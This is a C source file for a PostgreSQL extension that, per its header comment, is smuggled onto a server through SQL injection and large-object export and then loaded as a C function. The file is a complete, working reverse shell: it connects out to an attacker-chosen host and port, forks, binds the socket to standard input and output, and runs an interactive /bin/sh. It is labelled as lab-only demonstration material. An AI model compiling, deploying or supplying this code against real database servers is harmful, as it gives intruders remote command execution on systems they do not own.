/*
 * pg_rev_shell.c
 *
 * Lab-only PostgreSQL C extension used to demonstrate "Huong 2: PostgreSQL
 * Large Object + Extension" from command_execution_postgresql.md (Method 2:
 * PostgreSQL Extensions). Compiled into pg_rev_shell.so, pushed onto the
 * target server through pg_largeobject via a SQL injection point, exported
 * to disk with lo_export(), then loaded with CREATE FUNCTION ... LANGUAGE C.
 *
 * DO NOT deploy outside an isolated, authorized lab environment.
 */

#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(rev_shell);

Datum
rev_shell(PG_FUNCTION_ARGS)
{
    text   *host_arg = PG_GETARG_TEXT_PP(0);
    int32   port      = PG_GETARG_INT32(1);
    char   *host      = text_to_cstring(host_arg);

    int sockfd;
    struct sockaddr_in addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        PG_RETURN_INT32(-1);

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t) port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0)
    {
        close(sockfd);
        PG_RETURN_INT32(-2);
    }

    if (connect(sockfd, (struct sockaddr *) &addr, sizeof(addr)) != 0)
    {
        close(sockfd);
        PG_RETURN_INT32(-3);
    }

    /*
     * Keep the PostgreSQL backend responsive. The child owns the interactive
     * shell; the parent closes its socket and returns to the SQL caller.
     * This is intentionally lab-only: fork() from a backend is not a
     * general-purpose PostgreSQL extension pattern.
     */
    pid_t pid = fork();
    if (pid < 0)
    {
        close(sockfd);
        PG_RETURN_INT32(-4);
    }

    if (pid > 0)
    {
        close(sockfd);
        PG_RETURN_INT32((int32) pid);
    }

    if (setsid() < 0)
        _exit(10);

    if (dup2(sockfd, STDIN_FILENO) < 0 ||
        dup2(sockfd, STDOUT_FILENO) < 0 ||
        dup2(sockfd, STDERR_FILENO) < 0)
    {
        close(sockfd);
        _exit(11);
    }

    close(sockfd);
    execl("/bin/sh", "sh", "-i", NULL);

    /* execl only returns on failure; do not return through PostgreSQL code. */
    _exit(127);
}
